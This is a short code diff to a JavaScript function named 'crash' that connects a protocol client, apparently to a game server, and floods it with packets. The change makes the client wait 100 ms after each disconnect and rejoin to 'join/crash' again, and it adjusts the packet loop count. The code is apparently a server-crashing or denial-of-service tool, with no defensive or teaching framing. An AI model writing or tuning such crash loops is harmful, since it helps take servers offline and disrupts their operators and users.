@@ -32,8 +32,9 @@ const crash = async (options) => {
     const run = async () => {
 
         const client = new protocol.createClient(options);
-        const disconnected = (data = "None") => {
+        const disconnected = async (data = "None") => {
             console.log(`${new Date(Date.now()).toLocaleTimeString()} > ${options.username} disconnected!`, data);
+            await wait(100) // waits 100ms before attempting to join/crash
             return run();
         }
 
@@ -53,7 +54,7 @@ const crash = async (options) => {
             await wait(7);
             console.log(`${new Date(Date.now()).toLocaleTimeString()} > ${options.username} joined! Sending packets...`);
             let i = 0;
-            while (i < 9999) {
+            while (i < 99) {
                 const pos = data.player_position ?? {
                     x: 0,
                     y: 0,
